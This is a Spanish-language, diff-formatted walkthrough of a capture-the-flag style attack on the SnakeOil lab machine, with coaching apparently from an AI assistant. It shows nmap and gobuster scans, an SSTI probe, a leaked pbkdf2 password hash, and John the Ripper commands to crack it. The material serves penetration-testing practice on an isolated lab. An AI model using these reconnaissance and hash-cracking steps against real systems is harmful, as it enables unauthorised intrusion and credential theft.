@@ -1,0 +1,1188 @@
+Paso 1. Descomprimir la carpeta descargada de la maquina virtual Snakeoil
+
+Paso 2. Configurar la red de la maquina SnakeOil y la maquina atacante Kali Linux en red NAT
+
+    TU PC
+                      │
+                 VirtualBox
+                      │
+             Red Host-Only
+             192.168.56.0/24
+                 │        │
+                 │        │
+              KALI     SNAKEOIL
+            atacante     víctima
+
+Adaptador 1: NAT
+Adaptador 2: Adaptador solo-anfitrión
+Nombre: vboxnet0 (o el nombre de tu red Host-Only)
+
+El NAT le permitirá a Kali tener Internet. El Host-Only será exclusivamente para atacar a SNAKEOIL.
+
+
+Encender ambas VMs y revisar IPs
+En Kali: 'ip a' y busca la interfaz correspondiente al adaptador Host-Only (normalmente eth1 o similar), anota su IP (ej. 192.168.56.101). En SnakeOil, si tiene interfaz gráfica revisa igual, si no, no hace falta — la descubrirás con el escaneo.
+
+Escanear la red para encontrar a SnakeOil
+Ejecuta: 'sudo nmap -sn 192.168.56.0/24' (ajusta el rango según la IP que viste en el paso anterior, ej. si tu IP es 192.168.56.101 el rango es correcto). Esto muestra todos los hosts activos en ese segmento.
+
+
+Identificar la IP objetivo
+En el resultado deberías ver 2 direcciones: la de tu propia Kali y una adicional — esa es SnakeOil. Anótala, la usaremos en todos los comandos siguientes del informe.
+
+Como tanto .100 como .103 son "Oracle VirtualBox virtual NIC", una de las dos es el servidor DHCP interno de VirtualBox (que también reserva una IP) y la otra es SnakeOil de verdad. Vamos a diferenciarlas con un escaneo de puertos rápido a ambas — la que tenga puertos abiertos (SSH, HTTP, etc.) es tu objetivo real:
+
+Identificar cuál responde con servicios
+La IP que devuelva 'All 100 scanned ports are closed/filtered' o no responda con servicios es casi seguro el DHCP server virtual (no es una máquina real, solo un proceso de red). La que muestre puertos abiertos (22/ssh, 80/http, etc.) es SnakeOil.
+
+
+Determinamos que la IP 192.168.56.103 es la de SnakeOil
+
+Lanzar el escaneo completo
+Ejecuta: 'nmap -p- -sV -sC -oN nmap_full.txt 192.168.56.103'. Esto escanea los 65535 puertos ('-p-'), detecta versiones de servicios ('-sV'), corre scripts básicos de reconocimiento ('-sC'), y guarda todo en un archivo de texto ('-oN') que después puedes pegar directo en el informe.
+
+# Nmap 7.99 scan initiated Sun Sep  6 22:13:09 2026 as: /usr/lib/nmap/nmap --privileged -p- -sV -sC -oN nmap_full.txt 192.168.56.103
+Nmap scan report for 192.168.56.103
+Host is up (0.0017s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 73:a4:8f:94:a2:20:68:50:5a:ae:e1:d3:60:8d:ff:55 (RSA)
+|   256 f3:1b:d8:c3:0c:3f:5e:6b:ac:99:52:80:7b:d6:b6:e7 (ECDSA)
+|_  256 ea:61:64:b6:3b:d3:84:01:50:d8:1a:ab:38:29:12:e1 (ED25519)
+80/tcp   open  http    nginx 1.14.2
+|_http-title: Welcome to SNAKEOIL!
+|_http-server-header: nginx/1.14.2
+8080/tcp open  http    nginx 1.14.2
+|_http-title:  Welcome to Good Tech Inc.'s Snake Oil Project 
+|_http-server-header: nginx/1.14.2
+|_http-open-proxy: Proxy might be redirecting requests
+MAC Address: 08:00:27:C2:A4:A6 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Sep  6 22:13:32 2026 -- 1 IP address (1 host up) scanned in 23.07 seconds
+
+Perfecto. El escaneo ya nos da una superficie de ataque bastante clara. Tenemos 3 servicios abiertos:
+
+Puerto	Servicio	Versión
+22	SSH	OpenSSH 7.9p1 — Debian 10
+80	HTTP	nginx 1.14.2
+8080	HTTP	nginx 1.14.2
+
+Además, ambos sitios web parecen ser partes distintas de SNAKEOIL:
+
+80 → Welcome to SNAKEOIL!
+8080 → Good Tech Inc.'s Snake Oil Project
+
+Excelente hallazgo — tienes 3 servicios abiertos, y uno de ellos (el puerto 8080) tiene una pista muy interesante: nmap detectó que podría estar actuando como proxy (http-open-proxy: Proxy might be redirecting requests). Eso es una pista fuerte para investigar a fondo.
+
+view-source:http://192.168.56.103/
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Welcome to SNAKEOIL!</title>
+<style>
+    body {
+        width: 35em;
+        margin: 0 auto;
+        font-family: Tahoma, Verdana, Arial, sans-serif;
+    }
+</style>
+</head>
+<body>
+<h1>Welcome to SNAKEOIL!</h1>
+<p>Congratulations! SNAKEOIL is set up properly!</p>
+
+<p>If you are lost with life, <a href="https://www.google.com">Google</a> can help.<br/></p>
+
+</body>
+</html>
+
+view-source:http://192.168.56.103:8080/
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <title> Welcome to Good Tech Inc.'s Snake Oil Project </title>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-md navbar-light bg-light">
+        <a class="navbar-brand" href="/">Good Tech Inc</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav">
+            <li class="nav-item active">
+                <a class="nav-link" href="#">About</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/create">New Post</a>
+            </li>
+            </ul>
+        </div>
+    </nav>
+    <div class="container">
+        
+        
+    <h1> Welcome to Good Tech Inc.'s Snake Oil Project </h1>
+    
+        <a href="/1">
+            <h2>Introduction</h2>
+        </a>
+            <span class="badge badge-primary">2021-06-19 10:02:53</span>
+        <a href="/1/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+        <a href="/2">
+            <h2>House Rules</h2>
+        </a>
+            <span class="badge badge-primary">2021-06-19 10:02:53</span>
+        <a href="/2/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+        <a href="/4">
+            <h2>Useful Links</h2>
+        </a>
+            <span class="badge badge-primary">2021-08-18 00:29:46</span>
+        <a href="/4/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+  </body>
+</html>
+
+
+Enumerar directorios y archivos ocultos
+En cada puerto revisa: 'curl http://192.168.56.103/robots.txt' y 'curl http://192.168.56.103:8080/robots.txt'. También prueba con gobuster: 'gobuster dir -u http://192.168.56.103 -w /usr/share/wordlists/dirb/common.txt' y lo mismo apuntando al puerto 8080 ('-u http://192.168.56.103:8080'). Esto puede revelar rutas o paneles no enlazados públicamente.
+
+
+└─$ curl http://192.168.56.103/robots.txt
+<html>
+<head><title>404 Not Found</title></head>
+<body bgcolor="white">
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.14.2</center>
+</body>
+</html>
+                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.56.103:8080/robots.tx
+{"message":"Who moved my cheese?","success":false}
+
+
+└─$ gobuster dir -u http://192.168.56.103:8080 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.103:8080
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+04                   (Status: 200) [Size: 2324]
+01                   (Status: 200) [Size: 2193]
+02                   (Status: 200) [Size: 2356]
+1                    (Status: 200) [Size: 2193]
+2                    (Status: 200) [Size: 2356]
+4                    (Status: 200) [Size: 2324]
+create               (Status: 200) [Size: 2596]
+login                (Status: 405) [Size: 64]
+registration         (Status: 200) [Size: 29]
+run                  (Status: 405) [Size: 178]
+secret               (Status: 500) [Size: 37]
+test                 (Status: 200) [Size: 17]
+users                (Status: 200) [Size: 140]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+Investigar el comportamiento de proxy en el puerto 8080
+El aviso de nmap sugiere que el puerto 8080 podría estar reenviando peticiones a otro destino. Prueba: 'curl -v http://192.168.56.103:8080/' y observa los encabezados de respuesta (Server, X-Forwarded-*, Via, etc.) para ver si hay pistas de qué está detrás. También intenta pedirle algo que normalmente un proxy reenviaría, como: 'curl -v -H "Host: localhost" http://192.168.56.103:8080/'.
+
+
+curl -v http://192.168.56.103:8080/
+*   Trying 192.168.56.103:8080...
+* Established connection to 192.168.56.103 (192.168.56.103 port 8080) from 192.168.56.104 port 53572 
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: 192.168.56.103:8080
+> User-Agent: curl/8.20.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Mon, 07 Sep 2026 02:29:23 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 2882
+< Connection: keep-alive
+< 
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <title> Welcome to Good Tech Inc.'s Snake Oil Project </title>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-md navbar-light bg-light">
+        <a class="navbar-brand" href="/">Good Tech Inc</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav">
+            <li class="nav-item active">
+                <a class="nav-link" href="#">About</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/create">New Post</a>
+            </li>
+            </ul>
+        </div>
+    </nav>
+    <div class="container">
+        
+        
+    <h1> Welcome to Good Tech Inc.'s Snake Oil Project </h1>
+    
+        <a href="/1">
+            <h2>Introduction</h2>
+        </a>
+            <span class="badge badge-primary">2021-06-19 10:02:53</span>
+        <a href="/1/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+        <a href="/2">
+            <h2>House Rules</h2>
+        </a>
+            <span class="badge badge-primary">2021-06-19 10:02:53</span>
+        <a href="/2/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+        <a href="/4">
+            <h2>Useful Links</h2>
+        </a>
+            <span class="badge badge-primary">2021-08-18 00:29:46</span>
+        <a href="/4/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+  </body>
+* Connection #0 to host 192.168.56.103:8080 left intact
+</html>            
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -v -H "Host: localhost" http://192.168.56.103:8080/
+*   Trying 192.168.56.103:8080...
+* Established connection to 192.168.56.103 (192.168.56.103 port 8080) from 192.168.56.104 port 60768 
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: localhost
+> User-Agent: curl/8.20.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Mon, 07 Sep 2026 02:31:24 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 2882
+< Connection: keep-alive
+< 
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <title> Welcome to Good Tech Inc.'s Snake Oil Project </title>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-md navbar-light bg-light">
+        <a class="navbar-brand" href="/">Good Tech Inc</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav">
+            <li class="nav-item active">
+                <a class="nav-link" href="#">About</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/create">New Post</a>
+            </li>
+            </ul>
+        </div>
+    </nav>
+    <div class="container">
+        
+        
+    <h1> Welcome to Good Tech Inc.'s Snake Oil Project </h1>
+    
+        <a href="/1">
+            <h2>Introduction</h2>
+        </a>
+            <span class="badge badge-primary">2021-06-19 10:02:53</span>
+        <a href="/1/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+        <a href="/2">
+            <h2>House Rules</h2>
+        </a>
+            <span class="badge badge-primary">2021-06-19 10:02:53</span>
+        <a href="/2/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+        <a href="/4">
+            <h2>Useful Links</h2>
+        </a>
+            <span class="badge badge-primary">2021-08-18 00:29:46</span>
+        <a href="/4/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+    
+
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+  </body>
+* Connection #0 to host 192.168.56.103:8080 left intact
+</html>                
+
+
+Muy buen hallazgo — el puerto 8080 no es un proxy real, es una aplicación web tipo "blog" con posts numerados (1, 2, 4) y funciones de crear/editar sin que se vea autenticación de por medio. Eso ya es sospechoso para una máquina llamada "SnakeOil" (aceite de serpiente = falsa seguridad).
+
+Algo salta a la vista: falta el post /3 en el índice (hay 1, 2, 4, pero no 3). Eso es una pista clásica de un IDOR (Insecure Direct Object Reference) — un post que existe pero no está enlazado públicamente.
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.56.103:8080/3/edit
+{"message":"Who moved my cheese?","success":false}
+                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.56.103:8080/3     
+{"message":"Who moved my cheese?","success":false}
+                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
+
+Visita 'http://192.168.56.103:8080/1', '/2' y '/4' en el navegador y lee el contenido completo de cada post — en máquinas VulnHub es común que los posts contengan pistas textuales (nombres de usuario, rutas, tecnologías usadas, hasta contraseñas en texto plano).
+
+Contenidos
+
+/1
+
+Introduction
+2021-06-19 10:02:53
+
+Hi everyone. Welcome to the Good Tech Inc's Snake Oil Development Page.
+
+/2
+
+
+House Rules
+2021-06-19 10:02:53
+
+House Rules for Snake Oil: 1. Do obey the instructions of the Development Team. 2. Do <b>not</b> try to perform web application attacks on our system without authorisation. 3. Enjoy your time here! Patrick, Head Development
+
+/4
+
+Useful Links
+2021-08-18 00:29:46
+
+For building flask applications, we often require incorporating authentication into them. One way is through the use of JWTs. I personally use this: https://flask-jwt-extended.readthedocs.io/en/stable/options/
+
+Abre 'http://192.168.56.103:8080/create' y '/1/edit' en el navegador. Revisa qué campos de formulario existen (título, contenido, etc.) y si permiten HTML/markdown. Esto es clave porque un campo de texto sin sanitizar en una app así suele ser vector de XSS o, si usa un motor de plantillas (como Jinja2 en Flask), de Server-Side Template Injection (SSTI).
+
+/créate
+
+ Create a New Post
+Title
+Content
+
+
+Probar una inyección básica de plantilla (SSTI)
+Si tienes 'wappalyzer' o simplemente por los patrones del HTML (Bootstrap, sin extensión .php), sospecha que es una app en Python/Flask o similar. Prueba en el campo de título o contenido algo simple como '{{7*7}}' al crear un post y observa si el resultado devuelve '49' en vez del texto literal — eso confirmaría SSTI, un vector muy potente en Flask/Jinja2.
+
+
+ Welcome to Good Tech Inc.'s Snake Oil Project
+Introduction
+2021-06-19 10:02:53 Edit
+House Rules
+2021-06-19 10:02:53 Edit
+Useful Links
+2021-08-18 00:29:46 Edit
+{{7*7}}
+2026-09-07 02:41:40 Edit 
+
+
+Muy buena pista: la mención a flask-jwt-extended confirma que la app usa Flask con autenticación JWT — y el mensaje {"message":"Who moved my cheese?","success":false} en el post 3 es justo el tipo de respuesta que da un endpoint protegido cuando no envías el token correcto. Eso significa que probablemente existe un sistema de login/API que aún no hemos encontrado.
+
+Sobre el {{7*7}}: se guardó como texto literal en el listado, lo cual es buena señal de que el título no se renderiza como plantilla ahí — pero falta confirmar si el contenido del post individual sí se interpreta. Vamos a revisar eso y a buscar las rutas de autenticación:
+
+
+Ejecuta: 'curl http://192.168.56.103:8080/' y busca el ID que se le asignó a tu post de prueba (debería ser el 5). Luego: 'curl http://192.168.56.103:8080/5' para ver la página individual completa. Si en el HTML aparece '49' en vez de '{{7*7}}', confirma SSTI.
+
+    
+        <a href="/5">
+            <h2>{{7*7}}</h2>
+        </a>
+            <span class="badge badge-primary">2026-09-07 02:41:40</span>
+        <a href="/5/edit">
+            <span class="badge badge-warning">Edit</span>
+        </a>
+        <hr>
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.56.103:8080/5
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <title> {{7*7}} </title>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-md navbar-light bg-light">
+        <a class="navbar-brand" href="/">Good Tech Inc</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav">
+            <li class="nav-item active">
+                <a class="nav-link" href="#">About</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/create">New Post</a>
+            </li>
+            </ul>
+        </div>
+    </nav>
+    <div class="container">
+        
+        
+    <h2> {{7*7}} </h2>
+    <span class="badge badge-primary">2026-09-07 02:41:40</span>
+    <p>prueba</p>
+
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+  </body>
+</html>                                                                                                                 
+
+Buen dato — el título no es vulnerable a SSTI (Flask lo está tratando como texto plano, se ve el {{7*7}} literal en vez de 49, lo cual es el comportamiento correcto/seguro). Pero solo probamos el campo Title; falta probar el campo Content, que es donde va tu "prueba" — ese campo podría procesarse de forma diferente (por ejemplo, si soporta Markdown o si pasa por un motor de plantillas separado).                            
+
+                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.56.103:8080/6
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <title> Test2 </title>
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-md navbar-light bg-light">
+        <a class="navbar-brand" href="/">Good Tech Inc</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav">
+            <li class="nav-item active">
+                <a class="nav-link" href="#">About</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/create">New Post</a>
+            </li>
+            </ul>
+        </div>
+    </nav>
+    <div class="container">
+        
+        
+    <h2> Test2 </h2>
+    <span class="badge badge-primary">2026-09-07 02:47:37</span>
+    <p>{{7*7}}</p>
+
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+  </body>
+</html>     
+
+
+Entendido, SSTI descartado en ambos campos — buena disciplina de prueba y descarte, esto también va documentado en el informe como una prueba negativa.
+
+Escanear el puerto 8080 (la app del blog)
+Ejecuta: 'gobuster dir -u http://192.168.56.103:8080 -w /usr/share/wordlists/dirb/common.txt -x json,txt,html -t 40'. El flag '-x' hace que también pruebe esas extensiones sobre cada palabra, '-t 40' acelera con 40 hilos. Esto puede tardar 1-2 minutos.
+
+                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.56.103:8080 -w /usr/share/wordlists/dirb/common.txt -x json,txt,html -t 40
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.103:8080
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              txt,html,json
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+02                   (Status: 200) [Size: 2356]
+04                   (Status: 200) [Size: 2324]
+01                   (Status: 200) [Size: 2193]
+05                   (Status: 200) [Size: 2111]
+06                   (Status: 200) [Size: 2108]
+1                    (Status: 200) [Size: 2193]
+2                    (Status: 200) [Size: 2356]
+4                    (Status: 200) [Size: 2324]
+5                    (Status: 200) [Size: 2111]
+6                    (Status: 200) [Size: 2108]
+create               (Status: 200) [Size: 2596]
+login                (Status: 405) [Size: 64]
+registration         (Status: 200) [Size: 29]
+run                  (Status: 405) [Size: 178]
+secret               (Status: 500) [Size: 37]
+test                 (Status: 200) [Size: 17]
+users                (Status: 200) [Size: 140]
+Progress: 18452 / 18452 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.56.103 -w /usr/share/wordlists/dirb/common.txt -x json,txt,html -t 40     
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.103
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              json,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 18452 / 18452 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+Excelente, encontraste piezas clave. Interpretemos los códigos:
+
+registration (200) → probablemente un formulario o endpoint de registro de usuario
+login (405) → existe, pero no acepta GET — necesita POST (formulario de login)
+run (405) → mismo caso, existe pero espera POST — el nombre sugiere que ejecuta algo, muy interesante
+secret (500) → existe pero lanza error interno, probablemente espera parámetros específicos
+users (200, 140 bytes) → podría listar usuarios existentes
+test (200, 17 bytes) → probablemente solo un texto de prueba
+
+La secuencia lógica aquí es: registrarte → iniciar sesión → obtener un JWT → usarlo para acceder a /run o /secret.
+
+
+Ver el contenido de /users y /test
+Ejecuta: 'curl http://192.168.56.103:8080/users' y 'curl http://192.168.56.103:8080/test' para ver su contenido exacto (son GET válidos, así que deberían responder algo legible).
+
+
+Este es un hallazgo importante — el endpoint /users está filtrando credenciales sin autenticación (usuario patrick con su hash de contraseña). Eso ya es una vulnerabilidad crítica documentable. Y confirmamos que /registration necesita POST, no GET.
+
+Vamos por dos caminos en paralelo:
+
+Guardar el hash de Patrick en un archivo
+Copia el hash completo en un archivo: 'echo "patrick:\$pbkdf2-sha256\$29000\$e0/J.V.rVSol5HxPqdW6Nw\$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CGf84r040" > patrick_hash.txt' (asegúrate de que el formato quede como usuario:hash, con las barras invertidas escapadas si usas comillas dobles en bash).
+
+Descomprimir rockyou.txt si hace falta
+Si no tienes la wordlist descomprimida: 'sudo gunzip /usr/share/wordlists/rockyou.txt.gz' (si ya existe .txt, omite este paso).
+
+Intentar crackear el hash con John the Ripper
+Ejecuta: 'john --format=pbkdf2-hmac-sha256 patrick_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt'. Este formato de hash (pbkdf2-sha256 de passlib) es soportado directamente por John the Ripper. Puede tardar varios minutos dependiendo de tu CPU.
+
